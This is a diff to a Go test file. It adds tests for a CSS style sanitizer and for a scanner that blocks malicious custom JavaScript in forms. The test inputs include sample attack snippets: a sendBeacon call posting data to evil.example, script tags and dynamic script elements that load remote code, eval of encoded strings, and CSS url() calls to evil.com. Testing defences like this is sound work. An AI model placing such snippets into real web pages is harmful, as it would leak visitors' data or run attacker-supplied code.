@@ -115,6 +115,60 @@ func TestCollectOnlyRegisteredFields(t *testing.T) {
 	}
 }
 
+func TestSanitizeStyleAllowsSafeCSSOnly(t *testing.T) {
+	// Safe properties are kept.
+	out := SanitizeStyle("color:red;font-size:20px;margin-top:4px")
+	if !strings.Contains(out, "color: red") || !strings.Contains(out, "font-size: 20px") {
+		t.Errorf("safe style stripped: %q", out)
+	}
+	// url()/background-image are stripped (no remote request vector).
+	out = SanitizeStyle("color:red;background-image:url(https://evil.com/x);background:url(https://evil.com/y)")
+	if strings.Contains(out, "url(") {
+		t.Errorf("url() style not stripped: %q", out)
+	}
+	if !strings.Contains(out, "color: red") {
+		t.Errorf("safe style lost alongside url(): %q", out)
+	}
+	// Empty input → empty output.
+	if SanitizeStyle("") != "" || SanitizeStyle("   ") != "" {
+		t.Errorf("empty style not normalized to empty")
+	}
+	// A style that is entirely unsafe → empty.
+	if SanitizeStyle("background-image:url(https://evil.com/x)") != "" {
+		t.Errorf("fully-unsafe style not emptied")
+	}
+}
+
+func TestScanCustomJSBlocksMaliciousAllowsBenign(t *testing.T) {
+	// Malicious: dynamic code execution / obfuscation / external loads.
+	for _, js := range []string{
+		"eval(atob('x'))",
+		"document.write('<script src=\"//evil.example/x.js\"></script>')",
+		"a.constructor.constructor('alert(1)')()",
+		"navigator.sendBeacon('https://evil.example/collect', data)",
+		"var s=document.createElement('script'); s.src='https://evil.example/x.js';",
+	} {
+		if r := ScanCustomJS(js); r == "" {
+			t.Errorf("malicious JS not blocked: %q", js)
+		}
+	}
+	// Benign: ordinary form-behaviour JS (event handlers, validation, the
+	// owner's own analytics) must pass.
+	for _, js := range []string{
+		"document.querySelector('#of').addEventListener('submit', function(e){ console.log('hi'); });",
+		"function validate(){ var email=document.getElementById('email').value; return email.indexOf('@')>=0; }",
+		"document.getElementById('total').textContent = 'RM10.00';",
+	} {
+		if r := ScanCustomJS(js); r != "" {
+			t.Errorf("benign JS blocked: %q (%s)", js, r)
+		}
+	}
+	// Empty → no reason.
+	if r := ScanCustomJS(""); r != "" {
+		t.Errorf("empty JS blocked: %s", r)
+	}
+}
+
 func TestEnabledAndFromConfig(t *testing.T) {
 	cfg := map[string]any{
 		"mode": "response",
